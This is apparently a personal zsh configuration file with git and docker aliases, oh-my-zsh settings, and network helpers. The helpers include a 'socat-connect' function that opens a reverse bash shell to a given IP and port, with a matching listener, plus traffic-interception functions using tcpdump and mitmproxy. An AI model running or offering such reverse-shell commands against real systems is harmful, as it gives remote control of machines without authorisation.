
#export PS1="%m: %B%~%b $ "

addcs() {
   git add "*.cs"
}

addExt() {
   git add "*.$1"
}

yankcommit() {
   git rebase -p --onto $1^ $1
}

pbcat() {
    cat $1 | pbcopy
}

# Removes ^M windows carriage return character from a given file
removeCR() {
    sed -i -e 's/\r$//' $1
}

# Scans for bluetooth low energy from the given MAC address:
gattMAC() {
    ssh ubuntu01 gatttool -b $1  --characteristics
}

# Analyze traffic on network
mitm_router() {
    ssh router tcpdump -i eth0 -U -s0 -w - 'not port 22' | wireshark -k -i -
}

mitm_proxy_enable() {
    networksetup -setwebproxy wi-fi localhost 8080
    networksetup -setwebproxystate wi-fi on
    networksetup -setsecurewebproxy wi-fi localhost 8080
    networksetup -setsecurewebproxystate wi-fi on
    mitmproxy
}
mitm_proxy_disable() {
    networksetup -setwebproxystate wi-fi off
    networksetup -setsecurewebproxystate wi-fi off
}

function socat-listen() {
	if [ "$#" -ne 1 ]; then
           echo "[-] Usage: ./socat-listen.sh <10000:10050>"
           return 1
	fi
	socat file:`tty`,raw,echo=0 tcp-listen:$1
}

function socat-connect() {
	if [ "$#" -ne 2 ]; then
           echo "[-] Usage: ./socat-connect.sh <IP> <PORT>"
           return 1
	fi
   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT
}

alias utc="date -u"
alias cls="clear"
alias gs="git status"
alias gd="git diff"
alias difffiles="git diff master HEAD  --compact-summary"
alias gpb='git push origin $(git branch --show-current)'
alias githash="git rev-parse --short HEAD"
alias plz='sudo $(fc -ln -1)'
alias pull='git pull origin $(git branch --show-current)' 
alias gitscrub='git clean -xdf'
alias git-repair-gitignore='git rm --cached `git ls-files -i --exclude-from=.gitignore`'
alias diff-open="git diff --name-only | xargs $EDITOR"

# Search git history for the removal of a given string ($1)
function pickaxe() {
	git log -S $1
}

# Docker
alias dockershell="docker run --rm -i -t --entrypoint=/bin/bash"
alias dockershellsh="docker run --rm -i -t --entrypoint=/bin/sh"

function dockershellhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
}
function dockershellshhere() {
    dirname=${PWD##*/}
    docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
}

## Oh my Zsh

# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:/usr/local/bin:$PATH

export ZSH="$HOME/.oh-my-zsh"

# Set name of the theme to load --- if set to "random", it will
# load a random theme each time oh-my-zsh is loaded, in which case,
# to know which specific one was loaded, run: echo $RANDOM_THEME
# See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes
ZSH_THEME="robbyrussell"

# Set list of themes to pick from when loading at random
# Setting this variable when ZSH_THEME=random will cause zsh to load
# a theme from this variable instead of looking in $ZSH/themes/
# If set to an empty array, this variable will have no effect.
# ZSH_THEME_RANDOM_CANDIDATES=( "robbyrussell" "agnoster" )

# Uncomment the following line to use case-sensitive completion.
# CASE_SENSITIVE="true"

# Uncomment the following line to use hyphen-insensitive completion.
# Case-sensitive completion must be off. _ and - will be interchangeable.
# HYPHEN_INSENSITIVE="true"

# Uncomment the following line to disable bi-weekly auto-update checks.
# DISABLE_AUTO_UPDATE="true"

# Uncomment the following line to automatically update without prompting.
DISABLE_UPDATE_PROMPT="true"

# Uncomment the following line to change how often to auto-update (in days).
# export UPDATE_ZSH_DAYS=13

# Uncomment the following line if pasting URLs and other text is messed up.
# DISABLE_MAGIC_FUNCTIONS="true"

# Uncomment the following line to disable colors in ls.
# DISABLE_LS_COLORS="true"

# Uncomment the following line to disable auto-setting terminal title.
# DISABLE_AUTO_TITLE="true"

# Uncomment the following line to enable command auto-correction.
# ENABLE_CORRECTION="true"

# Uncomment the following line to display red dots whilst waiting for completion.
COMPLETION_WAITING_DOTS="true"

# Uncomment the following line if you want to disable marking untracked files
# under VCS as dirty. This makes repository status check for large repositories
# much, much faster.
# DISABLE_UNTRACKED_FILES_DIRTY="true"

# Uncomment the following line if you want to change the command execution time
# stamp shown in the history command output.
# You can set one of the optional three formats:
# "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
# or set a custom format using the strftime function format specifications,
# see 'man strftime' for details.
# HIST_STAMPS="mm/dd/yyyy"

# Would you like to use another custom folder than $ZSH/custom?
# ZSH_CUSTOM=/path/to/new-custom-folder

# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git) # git-open

source $ZSH/oh-my-zsh.sh

# User configuration

# export MANPATH="/usr/local/man:$MANPATH"

# You may need to manually set your language environment
# export LANG=en_US.UTF-8

# Preferred editor for local and remote sessions
# if [[ -n $SSH_CONNECTION ]]; then
#   export EDITOR='vim'
# else
#   export EDITOR='mvim'
# fi

# Compilation flags
# export ARCHFLAGS="-arch x86_64"

# Set personal aliases, overriding those provided by oh-my-zsh libs,
# plugins, and themes. Aliases can be placed here, though oh-my-zsh
# users are encouraged to define aliases within the ZSH_CUSTOM folder.
# For a full list of active aliases, run `alias`.
#
# Example aliases
# alias zshconfig="mate ~/.zshrc"
# alias ohmyzsh="mate ~/.oh-my-zsh"
